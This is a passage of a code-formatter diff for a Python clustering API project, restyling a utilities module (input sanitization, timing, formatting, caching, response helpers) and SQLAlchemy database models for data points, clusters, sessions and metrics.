         text = str(text)
-    
+
     # Truncate if too long
     if len(text) > max_length:
         text = text[:max_length]
-    
+
     # Remove control characters
-    text = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', text)
-    
+    text = re.sub(r"[\x00-\x1f\x7f-\x9f]", "", text)
+
     # Remove potential script tags
-    text = re.sub(r'<script[^>]*>.*?</script>', '', text, flags=re.IGNORECASE | re.DOTALL)
-    
+    text = re.sub(
+        r"<script[^>]*>.*?</script>", "", text, flags=re.IGNORECASE | re.DOTALL
+    )
+
     return text.strip()
 
 
 def sanitize_input(data: Any) -> Any:
     """
     Recursively sanitize input data.
-    
+
     Args:
         data: Input data structure
-        
+
     Returns:
         Sanitized data
     """
     if isinstance(data, str):
         return sanitize_string(data)
@@ -300,73 +316,74 @@
 
 
 def extract_numeric_values(data: Any) -> List[float]:
     """
     Extract numeric values from nested data structure.
-    
+
     Args:
         data: Input data
-        
+
     Returns:
         List of numeric values
     """
     values = []
-    
+
     def _extract(item):
         if isinstance(item, (int, float)) and np.isfinite(item):
             values.append(float(item))
         elif isinstance(item, (list, tuple)):
             for sub_item in item:
                 _extract(sub_item)
         elif isinstance(item, dict):
             for value in item.values():
                 _extract(value)
-    
+
     _extract(data)
     return values
 
 
 # =============================================================================
 # Performance Measurement
 # =============================================================================
+
 
 @dataclass
 class ExecutionTimer:
     """Context manager for measuring execution time."""
-    
+
     start_time: Optional[float] = None
     end_time: Optional[float] = None
-    
-    def __enter__(self) -> 'ExecutionTimer':
+
+    def __enter__(self) -> "ExecutionTimer":
         self.start_time = time.perf_counter()
         return self
-    
+
     def __exit__(self, exc_type, exc_val, exc_tb):
         self.end_time = time.perf_counter()
-    
+
     @property
     def elapsed_seconds(self) -> float:
         """Get elapsed time in seconds."""
         if self.start_time is None:
             return 0.0
         end = self.end_time or time.perf_counter()
         return end - self.start_time
-    
+
     @property
     def elapsed_ms(self) -> float:
         """Get elapsed time in milliseconds."""
         return self.elapsed_seconds * 1000
 
 
 @contextmanager
 def measure_execution_time() -> Iterator[ExecutionTimer]:
     """
     Context manager for measuring execution time.
-    
+
     Yields:
         ExecutionTimer instance
-        
+
     Example:
         with measure_execution_time() as timer:
             # do something
             pass
         print(f"Elapsed: {timer.elapsed_ms:.2f}ms")
@@ -377,60 +394,63 @@
 
 
 def timing_decorator(func: F) -> F:
     """
     Decorator to measure function execution time.
-    
+
     Args:
         func: Function to decorate
-        
+
     Returns:
         Decorated function that logs execution time
     """
+
     @functools.wraps(func)
     def wrapper(*args, **kwargs):
         with measure_execution_time() as timer:
             result = func(*args, **kwargs)
-        
+
         logger.debug(f"{func.__name__} took {timer.elapsed_ms:.2f}ms")
         return result
-    
+
     return wrapper
 
 
 def async_timing_decorator(func: Callable[..., Any]) -> Callable[..., Any]:
     """
     Decorator to measure async function execution time.
-    
+
     Args:
         func: Async function to decorate
-        
+
     Returns:
         Decorated async function that logs execution time
     """
+
     @functools.wraps(func)
     async def wrapper(*args, **kwargs):
         with measure_execution_time() as timer:
             result = await func(*args, **kwargs)
-        
+
         logger.debug(f"{func.__name__} took {timer.elapsed_ms:.2f}ms")
         return result
-    
+
     return wrapper
 
 
 # =============================================================================
 # Formatting Utilities
 # =============================================================================
 
+
 def format_processing_time(time_ms: float) -> str:
     """
     Format processing time for display.
-    
+
     Args:
         time_ms: Time in milliseconds
-        
+
     Returns:
         Formatted time string
     """
     if time_ms < 1:
         return f"{time_ms:.3f}ms"
@@ -441,36 +461,36 @@
 
 
 def format_memory_size(size_bytes: float) -> str:
     """
     Format memory size for display.
-    
+
     Args:
         size_bytes: Size in bytes
-        
+
     Returns:
         Formatted size string
     """
-    units = ['B', 'KB', 'MB', 'GB', 'TB']
+    units = ["B", "KB", "MB", "GB", "TB"]
     size = float(size_bytes)
-    
+
     for unit in units:
         if size < 1024.0:
             return f"{size:.1f}{unit}"
         size /= 1024.0
-    
+
     return f"{size:.1f}PB"
 
 
 def format_number(number: Union[int, float], precision: int = 2) -> str:
     """
     Format number with appropriate precision and thousand separators.
-    
+
     Args:
         number: Number to format
         precision: Decimal precision
-        
+
     Returns:
         Formatted number string
     """
     if isinstance(number, int):
         return f"{number:,}"
@@ -479,388 +499,393 @@
 
 
 def format_percentage(value: float, precision: int = 1) -> str:
     """
     Format percentage value.
-    
+
     Args:
         value: Value between 0 and 1
         precision: Decimal precision
-        
+
     Returns:
         Formatted percentage string
     """
     return f"{value * 100:.{precision}f}%"
 
 
-def format_timestamp(timestamp: Union[float, datetime], format_str: str = "%Y-%m-%d %H:%M:%S") -> str:
+def format_timestamp(
+    timestamp: Union[float, datetime], format_str: str = "%Y-%m-%d %H:%M:%S"
+) -> str:
     """
     Format timestamp for display.
-    
+
     Args:
         timestamp: Unix timestamp or datetime object
         format_str: Format string
-        
+
     Returns:
         Formatted timestamp string
     """
     if isinstance(timestamp, (int, float)):
         dt = datetime.fromtimestamp(timestamp)
     else:
         dt = timestamp
-    
+
     return dt.strftime(format_str)
 
 
 # =============================================================================
 # Mathematical and Statistical Utilities
 # =============================================================================
 
+
 def calculate_throughput(count: int, duration_seconds: float) -> float:
     """
     Calculate throughput rate.
-    
+
     Args:
         count: Number of items processed
         duration_seconds: Duration in seconds
-        
+
     Returns:
         Throughput in items per second
     """
     if duration_seconds <= 0:
         return 0.0
     return count / duration_seconds
 
 
-def calculate_percentiles(values: List[float], percentiles: List[float] = None) -> Dict[str, float]:
+def calculate_percentiles(
+    values: List[float], percentiles: List[float] = None
+) -> Dict[str, float]:
     """
     Calculate percentiles for a list of values.
-    
+
     Args:
         values: List of numeric values
         percentiles: List of percentile values (0-100)
-        
+
     Returns:
         Dictionary of percentile values
     """
     if not values:
         return {}
-    
+
     if percentiles is None:
         percentiles = [50, 75, 90, 95, 99]
-    
+
     np_values = np.array(values)
     result = {}
-    
+
     for p in percentiles:
         result[f"p{p}"] = float(np.percentile(np_values, p))
-    
+
     return result
 
 
 def calculate_statistics(values: List[float]) -> Dict[str, float]:
     """
     Calculate basic statistics for a list of values.
-    
+
     Args:
         values: List of numeric values
-        
+
     Returns:
         Dictionary of statistical measures
     """
     if not values:
         return {}
-    
+
     np_values = np.array(values)
-    
+
     return {
         "count": len(values),
         "mean": float(np.mean(np_values)),
         "median": float(np.median(np_values)),
         "std": float(np.std(np_values)),
         "min": float(np.min(np_values)),
         "max": float(np.max(np_values)),
-        "sum": float(np.sum(np_values))
+        "sum": float(np.sum(np_values)),
     }
 
 
 def estimate_memory_usage(data: Any) -> int:
     """
     Estimate memory usage of data structure in bytes.
-    
+
     Args:
         data: Data structure to analyze
-        
+
     Returns:
         Estimated memory usage in bytes
     """
     import sys
-    
+
     def _estimate(obj, seen=None):
         if seen is None:
             seen = set()
-        
+
         obj_id = id(obj)
         if obj_id in seen:
             return 0
-        
+
         seen.add(obj_id)
         size = sys.getsizeof(obj)
-        
+
         if isinstance(obj, dict):
             size += sum(_estimate(k, seen) + _estimate(v, seen) for k, v in obj.items())
         elif isinstance(obj, (list, tuple, set)):
             size += sum(_estimate(item, seen) for item in obj)
-        elif hasattr(obj, '__dict__'):
+        elif hasattr(obj, "__dict__"):
             size += _estimate(obj.__dict__, seen)
-        
+
         return size
-    
+
     return _estimate(data)
 
 
 def normalize_vector(vector: List[float]) -> List[float]:
     """
     Normalize vector to unit length.
-    
+
     Args:
         vector: Input vector
-        
+
     Returns:
         Normalized vector
     """
     np_vector = np.array(vector)
     norm = np.linalg.norm(np_vector)
-    
+
     if norm == 0:
         return vector
-    
+
     return (np_vector / norm).tolist()
 
 
 def cosine_similarity(vec1: List[float], vec2: List[float]) -> float:
     """
     Calculate cosine similarity between two vectors.
-    
+
     Args:
         vec1: First vector
         vec2: Second vector
-        
+
     Returns:
         Cosine similarity (-1 to 1)
     """
     if len(vec1) != len(vec2):
         raise ValueError("Vectors must have same length")
-    
+
     np1 = np.array(vec1)
     np2 = np.array(vec2)
-    
+
     dot_product = np.dot(np1, np2)
     norm1 = np.linalg.norm(np1)
     norm2 = np.linalg.norm(np2)
-    
+
     if norm1 == 0 or norm2 == 0:
         return 0.0
-    
+
     return float(dot_product / (norm1 * norm2))
 
 
 # =============================================================================
 # Caching Utilities
 # =============================================================================
+
 
 class LRUCache(Generic[T]):
     """Simple LRU cache implementation."""
-    
+
     def __init__(self, max_size: int = 128):
         self.max_size = max_size
         self.cache: Dict[str, T] = {}
         self.access_order: List[str] = []
         self.lock = threading.RLock()
-    
+
     def get(self, key: str) -> Optional[T]:
         """Get value from cache."""
         with self.lock:
             if key in self.cache:
                 # Move to end (most recently used)
                 self.access_order.remove(key)
                 self.access_order.append(key)
                 return self.cache[key]
             return None
-    
+
     def put(self, key: str, value: T) -> None:
         """Put value in cache."""
         with self.lock:
             if key in self.cache:
                 # Update existing
                 self.access_order.remove(key)
             elif len(self.cache) >= self.max_size:
                 # Remove least recently used
                 lru_key = self.access_order.pop(0)
                 del self.cache[lru_key]
-            
+
             self.cache[key] = value
             self.access_order.append(key)
-    
+
     def clear(self) -> None:
         """Clear cache."""
         with self.lock:
             self.cache.clear()
             self.access_order.clear()
-    
+
     def size(self) -> int:
         """Get cache size."""
         return len(self.cache)
 
 
 def cache_key_generator(*args, **kwargs) -> str:
     """
     Generate cache key from function arguments.
-    
+
     Args:
         *args: Positional arguments
         **kwargs: Keyword arguments
-        
+
     Returns:
         Cache key string
     """
     # Convert arguments to hashable form
     key_parts = []
-    
+
     for arg in args:
         if isinstance(arg, (str, int, float, bool, type(None))):
             key_parts.append(str(arg))
         elif isinstance(arg, (list, tuple)):
             key_parts.append(str(tuple(arg)))
         elif isinstance(arg, dict):
             key_parts.append(str(sorted(arg.items())))
         else:
             key_parts.append(str(hash(str(arg))))
-    
+
     for k, v in sorted(kwargs.items()):
         key_parts.append(f"{k}={v}")
-    
+
     return hashlib.md5("_".join(key_parts).encode()).hexdigest()
 
 
 def memoize(maxsize: int = 128):
     """
     Memoization decorator with LRU cache.
-    
+
     Args:
         maxsize: Maximum cache size
-        
+
     Returns:
         Decorator function
     """
+
     def decorator(func: F) -> F:
         cache = LRUCache[Any](maxsize)
-        
+
         @functools.wraps(func)
         def wrapper(*args, **kwargs):
             key = cache_key_generator(*args, **kwargs)
             result = cache.get(key)
-            
+
             if result is None:
                 result = func(*args, **kwargs)
                 cache.put(key, result)
-            
+
             return result
-        
+
         # Add cache management methods
         wrapper.cache_clear = cache.clear
         wrapper.cache_size = cache.size
-        
+
         return wrapper
-    
+
     return decorator
 
 
 # =============================================================================
 # Error Response Utilities
 # =============================================================================
+
 
 def create_error_response(
     error_code: ErrorCode,
     message: str,
     details: Optional[Dict[str, Any]] = None,
     suggestion: Optional[str] = None,
-    request_id: Optional[str] = None
+    request_id: Optional[str] = None,
 ) -> Dict[str, Any]:
     """
     Create standardized error response.
-    
+
     Args:
         error_code: Error code
         message: Error message
         details: Additional details
         suggestion: Suggested action
         request_id: Request identifier
-        
+
     Returns:
         Error response dictionary
     """
     return {
         "success": False,
         "error_code": error_code.value,
         "message": message,
         "details": details or {},
         "suggestion": suggestion,
         "request_id": request_id,
-        "timestamp": time.time()
+        "timestamp": time.time(),
     }
 
 
 def create_success_response(
     data: Any,
     message: Optional[str] = None,
     request_id: Optional[str] = None,
-    execution_time_ms: Optional[float] = None
+    execution_time_ms: Optional[float] = None,
 ) -> Dict[str, Any]:
     """
     Create standardized success response.
-    
+
     Args:
         data: Response data
         message: Success message
         request_id: Request identifier
         execution_time_ms: Execution time
-        
+
     Returns:
         Success response dictionary
     """
-    response = {
-        "success": True,
-        "data": data,
-        "timestamp": time.time()
-    }
-    
+    response = {"success": True, "data": data, "timestamp": time.time()}
+
     if message:
         response["message"] = message
-    
+
     if request_id:
         response["request_id"] = request_id
-    
+
     if execution_time_ms is not None:
         response["execution_time_ms"] = execution_time_ms
-    
+
     return response
 
 
 # =============================================================================
 # Async Utilities
 # =============================================================================
 
+
 async def run_in_thread_pool(func: Callable[..., T], *args, **kwargs) -> T:
     """
     Run blocking function in thread pool.
-    
+
     Args:
         func: Function to run
         *args: Positional arguments
         **kwargs: Keyword arguments
-        
+
     Returns:
         Function result
     """
     loop = asyncio.get_event_loop()
     return await loop.run_in_executor(None, functools.partial(func, **kwargs), *args)
@@ -868,14 +893,14 @@
 
 @asynccontextmanager
 async def async_timeout(seconds: float):
     """
     Async context manager for timeouts.
-    
+
     Args:
         seconds: Timeout in seconds
-        
+
     Raises:
         asyncio.TimeoutError: If timeout is exceeded
     """
     try:
         async with asyncio.timeout(seconds):
@@ -885,139 +910,136 @@
 
 
 def create_task_with_timeout(coro, timeout_seconds: float) -> asyncio.Task:
     """
     Create asyncio task with timeout.
-    
+
     Args:
         coro: Coroutine
         timeout_seconds: Timeout in seconds
-        
+
     Returns:
         Asyncio task
     """
+
     async def wrapper():
         async with async_timeout(timeout_seconds):
             return await coro
-    
+
     return asyncio.create_task(wrapper())
 
 
 # =============================================================================
 # Configuration Utilities
 # =============================================================================
 
+
 def parse_env_bool(value: str) -> bool:
     """
     Parse boolean value from environment variable.
-    
+
     Args:
         value: String value
-        
+
     Returns:
         Boolean value
     """
-    return value.lower() in ('true', '1', 'yes', 'on', 'enabled')
-
-
-def parse_env_list(value: str, separator: str = ',') -> List[str]:
+    return value.lower() in ("true", "1", "yes", "on", "enabled")
+
+
+def parse_env_list(value: str, separator: str = ",") -> List[str]:
     """
     Parse list from environment variable.
-    
+
     Args:
         value: String value
         separator: List separator
-        
+
     Returns:
         List of strings
     """
     if not value:
         return []
-    
+
     return [item.strip() for item in value.split(separator) if item.strip()]
 
 
 def merge_configs(*configs: Dict[str, Any]) -> Dict[str, Any]:
     """
     Merge configuration dictionaries.
-    
+
     Args:
         *configs: Configuration dictionaries
-        
+
     Returns:
         Merged configuration
     """
     merged = {}
-    
+
     for config in configs:
         for key, value in config.items():
-            if isinstance(value, dict) and key in merged and isinstance(merged[key], dict):
+            if (
+                isinstance(value, dict)
+                and key in merged
+                and isinstance(merged[key], dict)
+            ):
                 merged[key] = merge_configs(merged[key], value)
             else:
                 merged[key] = value
-    
+
     return merged
 
 
 # =============================================================================
 # Export All Utilities
 # =============================================================================
 
 __all__ = [
     # ID generation
     "generate_request_id",
-    "generate_session_id", 
+    "generate_session_id",
     "generate_api_key_id",
     "generate_cluster_id",
     "create_hash",
-    
     # Data validation
     "validate_data_point",
     "validate_batch_size",
     "validate_coordinates",
     "validate_clustering_params",
-    
     # Input sanitization
     "sanitize_string",
     "sanitize_input",
     "extract_numeric_values",
-    
     # Performance measurement
     "ExecutionTimer",
     "measure_execution_time",
     "timing_decorator",
     "async_timing_decorator",
-    
     # Formatting
     "format_processing_time",
     "format_memory_size",
     "format_number",
     "format_percentage",
     "format_timestamp",
-    
     # Mathematical utilities
     "calculate_throughput",
     "calculate_percentiles",
     "calculate_statistics",
     "estimate_memory_usage",
     "normalize_vector",
     "cosine_similarity",
-    
     # Caching
     "LRUCache",
     "cache_key_generator",
     "memoize",
-    
     # Response utilities
     "create_error_response",
     "create_success_response",
-    
     # Async utilities
     "run_in_thread_pool",
     "async_timeout",
     "create_task_with_timeout",
-    
     # Configuration utilities
     "parse_env_bool",
-    "parse_env_list", 
+    "parse_env_list",
     "merge_configs",
-]
\ No newline at end of file
+]
--- /home/runner/work/NCS-API-Project/NCS-API-Project/database/models.py	2025-06-10 20:31:25.477857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/database/models.py	2025-06-10 20:32:33.815392+00:00
@@ -9,500 +9,600 @@
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/database/models.py
 from datetime import datetime, timezone
 from typing import Optional, Dict, Any, List
 from decimal import Decimal
 
 from sqlalchemy import (
-    Column, String, Integer, Float, DateTime, Boolean, Text, JSON,
-    ForeignKey, Index, UniqueConstraint, CheckConstraint, DECIMAL,
-    LargeBinary, SmallInteger, BigInteger
+    Column,
+    String,
+    Integer,
+    Float,
+    DateTime,
+    Boolean,
+    Text,
+    JSON,
+    ForeignKey,
+    Index,
+    UniqueConstraint,
+    CheckConstraint,
+    DECIMAL,
+    LargeBinary,
+    SmallInteger,
+    BigInteger,
 )
 from sqlalchemy.ext.declarative import declarative_base
 from sqlalchemy.orm import relationship, validates
 from sqlalchemy.dialects.postgresql import UUID, ARRAY, JSONB
 from sqlalchemy.sql import func
 from sqlalchemy.ext.hybrid import hybrid_property
 
 Base = declarative_base()
 
+
 class TimestampMixin:
     """Mixin for adding timestamp columns to models."""
-    created_at = Column(DateTime(timezone=True), server_default=func.now(), nullable=False)
-    updated_at = Column(DateTime(timezone=True), server_default=func.now(), onupdate=func.now(), nullable=False)
+
+    created_at = Column(
+        DateTime(timezone=True), server_default=func.now(), nullable=False
+    )
+    updated_at = Column(
+        DateTime(timezone=True),
+        server_default=func.now(),
+        onupdate=func.now(),
+        nullable=False,
+    )
+
 
 class DataPointRecord(Base, TimestampMixin):
     """
     Records individual data points processed by the clustering algorithm.
-    
+
     Stores the raw data points, their features, cluster assignments,
     and processing metadata for analysis and debugging.
     """
-    __tablename__ = 'data_points'
-    
+
+    __tablename__ = "data_points"
+
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
-    session_id = Column(UUID(as_uuid=True), ForeignKey('processing_sessions.id'), nullable=False)
+    session_id = Column(
+        UUID(as_uuid=True), ForeignKey("processing_sessions.id"), nullable=False
+    )
     point_id = Column(String(255), nullable=False)  # External point identifier
-    
+
     # Data point features and metadata
     features = Column(JSONB, nullable=False)  # Raw feature vector
     normalized_features = Column(JSONB)  # Normalized feature vector
     dimensionality = Column(SmallInteger, nullable=False)
-    
+
     # Clustering results
-    cluster_id = Column(UUID(as_uuid=True), ForeignKey('clusters.id'), nullable=True)
+    cluster_id = Column(UUID(as_uuid=True), ForeignKey("clusters.id"), nullable=True)
     is_outlier = Column(Boolean, default=False, nullable=False)
     outlier_score = Column(Float)  # Outlier detection score
     confidence_score = Column(Float)  # Cluster assignment confidence
-    
+
     # Processing metadata
-    processing_order = Column(BigInteger, nullable=False)  # Order in which point was processed
+    processing_order = Column(
+        BigInteger, nullable=False
+    )  # Order in which point was processed
     processing_time_ms = Column(Float)  # Time taken to process this point
     algorithm_version = Column(String(50), nullable=False)
-    
+
     # Similarity metrics
     nearest_cluster_distance = Column(Float)
     second_nearest_distance = Column(Float)
     silhouette_score = Column(Float)
-    
+
     # Quality metrics
     stability_score = Column(Float)  # How stable is the cluster assignment
     novelty_score = Column(Float)  # How novel/different is this point
-    
+
     # Relationships
     session = relationship("ProcessingSession", back_populates="data_points")
     cluster = relationship("ClusterRecord", back_populates="data_points")
-    
+
     __table_args__ = (
-        Index('idx_data_points_session_order', 'session_id', 'processing_order'),
-        Index('idx_data_points_cluster', 'cluster_id'),
-        Index('idx_data_points_outlier', 'is_outlier'),
-        Index('idx_data_points_created', 'created_at'),
-        UniqueConstraint('session_id', 'point_id', name='uq_session_point'),
-        CheckConstraint('dimensionality > 0', name='ck_positive_dimensionality'),
-        CheckConstraint('outlier_score >= 0 AND outlier_score <= 1', name='ck_outlier_score_range'),
-        CheckConstraint('confidence_score >= 0 AND confidence_score <= 1', name='ck_confidence_range')
-    )
-    
-    @validates('features')
+        Index("idx_data_points_session_order", "session_id", "processing_order"),
+        Index("idx_data_points_cluster", "cluster_id"),
+        Index("idx_data_points_outlier", "is_outlier"),
+        Index("idx_data_points_created", "created_at"),
+        UniqueConstraint("session_id", "point_id", name="uq_session_point"),
+        CheckConstraint("dimensionality > 0", name="ck_positive_dimensionality"),
+        CheckConstraint(
+            "outlier_score >= 0 AND outlier_score <= 1", name="ck_outlier_score_range"
+        ),
+        CheckConstraint(
+            "confidence_score >= 0 AND confidence_score <= 1",
+            name="ck_confidence_range",
+        ),
+    )
+
+    @validates("features")
     def validate_features(self, key, features):
         """Validate that features is a non-empty list of numbers."""
         if not isinstance(features, list) or len(features) == 0:
             raise ValueError("Features must be a non-empty list")
         if not all(isinstance(x, (int, float)) for x in features):
             raise ValueError("All features must be numeric")
         return features
-    
+
     @hybrid_property
     def cluster_stability(self):
         """Calculate cluster assignment stability based on distances."""
-        if self.nearest_cluster_distance is None or self.second_nearest_distance is None:
+        if (
+            self.nearest_cluster_distance is None
+            or self.second_nearest_distance is None
+        ):
             return None
         if self.second_nearest_distance == 0:
             return 1.0
         return 1.0 - (self.nearest_cluster_distance / self.second_nearest_distance)
 
+
 class ClusterRecord(Base, TimestampMixin):
     """
     Records cluster information and evolution over time.
-    
+
     Tracks cluster properties, health metrics, and statistical summaries
     for monitoring algorithm performance and cluster quality.
     """
-    __tablename__ = 'clusters'
-    
+
+    __tablename__ = "clusters"
+
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
-    session_id = Column(UUID(as_uuid=True), ForeignKey('processing_sessions.id'), nullable=False)
+    session_id = Column(
+        UUID(as_uuid=True), ForeignKey("processing_sessions.id"), nullable=False
+    )
     cluster_label = Column(String(100), nullable=False)  # Human-readable cluster name
-    
+
     # Cluster properties
     centroid = Column(JSONB, nullable=False)  # Cluster center coordinates
     dimensionality = Column(SmallInteger, nullable=False)
     radius = Column(Float, nullable=False)  # Cluster radius/spread
     density = Column(Float)  # Point density within cluster
-    
+
     # Statistical properties
     point_count = Column(Integer, default=0, nullable=False)
     min_points = Column(Integer, nullable=False)  # Minimum points required
     max_points = Column(Integer)  # Maximum points allowed
-    
+
     # Quality metrics
     cohesion = Column(Float)  # Intra-cluster similarity
     separation = Column(Float)  # Inter-cluster distance
     silhouette_avg = Column(Float)  # Average silhouette score
     stability_score = Column(Float)  # Temporal stability
-    
+
     # Health and lifecycle
-    health_status = Column(String(20), default='healthy', nullable=False)
+    health_status = Column(String(20), default="healthy", nullable=False)
     is_active = Column(Boolean, default=True, nullable=False)
     last_updated = Column(DateTime(timezone=True), server_default=func.now())
     merge_candidate = Column(Boolean, default=False)
     split_candidate = Column(Boolean, default=False)
-    
+
     # Evolution tracking
-    parent_cluster_id = Column(UUID(as_uuid=True), ForeignKey('clusters.id'))
+    parent_cluster_id = Column(UUID(as_uuid=True), ForeignKey("clusters.id"))
     generation = Column(SmallInteger, default=0, nullable=False)
     split_count = Column(SmallInteger, default=0)
     merge_count = Column(SmallInteger, default=0)
-    
+
     # Performance metrics
     last_access_time = Column(DateTime(timezone=True))
     access_frequency = Column(Integer, default=0)
     update_frequency = Column(Integer, default=0)
-    
+
     # Relationships
     session = relationship("ProcessingSession", back_populates="clusters")
-    data_points = relationship("DataPointRecord", back_populates="cluster", cascade="all, delete-orphan")
+    data_points = relationship(
+        "DataPointRecord", back_populates="cluster", cascade="all, delete-orphan"
+    )
     parent_cluster = relationship("ClusterRecord", remote_side=[id])
-    
+
     __table_args__ = (
-        Index('idx_clusters_session', 'session_id'),
-        Index('idx_clusters_active', 'is_active'),
-        Index('idx_clusters_health', 'health_status'),
-        Index('idx_clusters_label', 'cluster_label'),
-        Index('idx_clusters_updated', 'last_updated'),
-        CheckConstraint('point_count >= 0', name='ck_non_negative_points'),
-        CheckConstraint('radius > 0', name='ck_positive_radius'),
-        CheckConstraint('health_status IN (\'healthy\', \'warning\', \'critical\', \'inactive\')', 
-                       name='ck_valid_health_status'),
-        CheckConstraint('generation >= 0', name='ck_non_negative_generation')
-    )
-    
-    @validates('centroid')
+        Index("idx_clusters_session", "session_id"),
+        Index("idx_clusters_active", "is_active"),
+        Index("idx_clusters_health", "health_status"),
+        Index("idx_clusters_label", "cluster_label"),
+        Index("idx_clusters_updated", "last_updated"),
+        CheckConstraint("point_count >= 0", name="ck_non_negative_points"),
+        CheckConstraint("radius > 0", name="ck_positive_radius"),
+        CheckConstraint(
+            "health_status IN ('healthy', 'warning', 'critical', 'inactive')",
+            name="ck_valid_health_status",
+        ),
+        CheckConstraint("generation >= 0", name="ck_non_negative_generation"),
+    )
+
+    @validates("centroid")
     def validate_centroid(self, key, centroid):
         """Validate centroid is a list of numbers matching dimensionality."""
         if not isinstance(centroid, list):
             raise ValueError("Centroid must be a list")
         if len(centroid) != self.dimensionality:
             raise ValueError(f"Centroid must have {self.dimensionality} dimensions")
         return centroid
-    
+
     @hybrid_property
     def is_stable(self):
         """Check if cluster is considered stable."""
-        return (self.stability_score is not None and 
-                self.stability_score > 0.7 and 
-                self.point_count >= self.min_points)
-    
+        return (
+            self.stability_score is not None
+            and self.stability_score > 0.7
+            and self.point_count >= self.min_points
+        )
+
     @hybrid_property
     def quality_score(self):
         """Calculate overall cluster quality score."""
         if None in [self.cohesion, self.separation, self.silhouette_avg]:
             return None
-        return (self.cohesion * 0.4 + self.separation * 0.3 + self.silhouette_avg * 0.3)
+        return self.cohesion * 0.4 + self.separation * 0.3 + self.silhouette_avg * 0.3
+
 
 class ProcessingSession(Base, TimestampMixin):
     """
     Records clustering processing sessions and their configuration.
-    
+
     Tracks session parameters, performance metrics, and overall results
     for each clustering run or continuous processing period.
     """
-    __tablename__ = 'processing_sessions'
-    
+
+    __tablename__ = "processing_sessions"
+
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
     session_name = Column(String(255), nullable=False)
     user_id = Column(String(255), nullable=False)  # User who initiated session
-    
+
     # Session configuration
     algorithm_config = Column(JSONB, nullable=False)  # NCS algorithm parameters
     input_source = Column(String(500))  # Data source description
-    session_type = Column(String(50), default='batch', nullable=False)  # batch, streaming, etc.
-    
+    session_type = Column(
+        String(50), default="batch", nullable=False
+    )  # batch, streaming, etc.
+
     # Status and lifecycle
-    status = Column(String(20), default='active', nullable=False)
-    start_time = Column(DateTime(timezone=True), server_default=func.now(), nullable=False)
+    status = Column(String(20), default="active", nullable=False)
+    start_time = Column(
+        DateTime(timezone=True), server_default=func.now(), nullable=False
+    )
     end_time = Column(DateTime(timezone=True))
     total_duration_seconds = Column(Float)
-    
+
     # Data statistics
     total_points_processed = Column(BigInteger, default=0, nullable=False)
     total_points_clustered = Column(BigInteger, default=0, nullable=False)
     total_outliers_detected = Column(BigInteger, default=0, nullable=False)
     unique_clusters_created = Column(Integer, default=0, nullable=False)
-    
+
     # Performance metrics
     avg_processing_time_ms = Column(Float)
     max_processing_time_ms = Column(Float)
     min_processing_time_ms = Column(Float)
     throughput_points_per_sec = Column(Float)
-    
+
     # Quality metrics
     overall_silhouette_score = Column(Float)
     cluster_purity = Column(Float)
     noise_ratio = Column(Float)  # Percentage of outliers
-    
+
     # Resource utilization
     peak_memory_usage_mb = Column(Float)
     avg_cpu_usage_percent = Column(Float)
     disk_io_mb = Column(Float)
-    
+
     # Error handling
     error_count = Column(Integer, default=0, nullable=False)
     warning_count = Column(Integer, default=0, nullable=False)
     last_error_message = Column(Text)
     last_error_time = Column(DateTime(timezone=True))
-    
+
     # Configuration tracking
     algorithm_version = Column(String(50), nullable=False)
     api_version = Column(String(20), nullable=False)
-    
+
     # Relationships
-    data_points = relationship("DataPointRecord", back_populates="session", cascade="all, delete-orphan")
-    clusters = relationship("ClusterRecord", back_populates="session", cascade="all, delete-orphan")
-    performance_metrics = relationship("PerformanceMetric", back_populates="session", cascade="all, delete-orphan")
-    
+    data_points = relationship(
+        "DataPointRecord", back_populates="session", cascade="all, delete-orphan"
+    )
+    clusters = relationship(
+        "ClusterRecord", back_populates="session", cascade="all, delete-orphan"
+    )
+    performance_metrics = relationship(
+        "PerformanceMetric", back_populates="session", cascade="all, delete-orphan"
+    )
+
     __table_args__ = (
-        Index('idx_sessions_user', 'user_id'),
-        Index('idx_sessions_status', 'status'),
-        Index('idx_sessions_start_time', 'start_time'),
-        Index('idx_sessions_type', 'session_type'),
-        CheckConstraint('status IN (\'active\', \'completed\', \'failed\', \'cancelled\')', 
-                       name='ck_valid_status'),
-        CheckConstraint('total_points_processed >= 0', name='ck_non_negative_processed'),
-        CheckConstraint('throughput_points_per_sec >= 0', name='ck_non_negative_throughput')
-    )
-    
+        Index("idx_sessions_user", "user_id"),
+        Index("idx_sessions_status", "status"),
+        Index("idx_sessions_start_time", "start_time"),
+        Index("idx_sessions_type", "session_type"),
+        CheckConstraint(
+            "status IN ('active', 'completed', 'failed', 'cancelled')",
+            name="ck_valid_status",
+        ),
+        CheckConstraint(
+            "total_points_processed >= 0", name="ck_non_negative_processed"
+        ),
+        CheckConstraint(
+            "throughput_points_per_sec >= 0", name="ck_non_negative_throughput"
+        ),
+    )
+
     @hybrid_property
     def is_completed(self):
         """Check if session is completed."""
-        return self.status in ['completed', 'failed', 'cancelled']
-    
+        return self.status in ["completed", "failed", "cancelled"]
+
     @hybrid_property
     def clustering_efficiency(self):
         """Calculate clustering efficiency (clustered/processed ratio)."""
         if self.total_points_processed == 0:
             return 0.0
         return self.total_points_clustered / self.total_points_processed
 
+
 class PerformanceMetric(Base, TimestampMixin):
     """
     Detailed performance metrics collected during processing.
-    
+
     Stores fine-grained performance data for monitoring, optimization,
     and troubleshooting of the clustering algorithm.
     """
-    __tablename__ = 'performance_metrics'
-    
+
+    __tablename__ = "performance_metrics"
+
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
-    session_id = Column(UUID(as_uuid=True), ForeignKey('processing_sessions.id'), nullable=False)
+    session_id = Column(
+        UUID(as_uuid=True), ForeignKey("processing_sessions.id"), nullable=False
+    )
     metric_name = Column(String(100), nullable=False)
-    metric_category = Column(String(50), nullable=False)  # timing, memory, throughput, etc.
-    
+    metric_category = Column(
+        String(50), nullable=False
+    )  # timing, memory, throughput, etc.
+
     # Metric values
     numeric_value = Column(DECIMAL(20, 6))
     string_value = Column(String(500))
     json_value = Column(JSONB)
-    
+
     # Measurement context
-    measurement_timestamp = Column(DateTime(timezone=True), server_default=func.now(), nullable=False)
+    measurement_timestamp = Column(
+        DateTime(timezone=True), server_default=func.now(), nullable=False
+    )
     measurement_window_seconds = Column(Float)  # Time window for the measurement
